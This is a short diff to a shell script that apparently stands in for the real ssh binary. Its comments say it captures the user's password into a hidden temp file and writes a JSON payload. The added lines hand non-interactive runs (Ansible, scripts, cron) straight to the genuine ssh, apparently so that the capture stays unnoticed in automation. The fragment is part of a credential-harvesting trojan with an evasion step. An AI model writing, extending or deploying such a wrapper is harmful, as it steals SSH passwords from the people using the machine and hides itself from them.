@@ -64,6 +64,12 @@ for arg in "$@"; do
     esac
 done
 
+# Pass straight through if stdin is not a terminal
+# (Ansible, scripts, cron — anything non-interactive)
+if [ ! -t 0 ]; then
+    exec $REAL_SSH "$@"
+fi
+
 # PWFILE holds the captured password
 # PAYFILE holds the JSON payload — written by expect, read by bash for local log
 PWFILE=$(mktemp /tmp/.sshpw.XXXXXX)
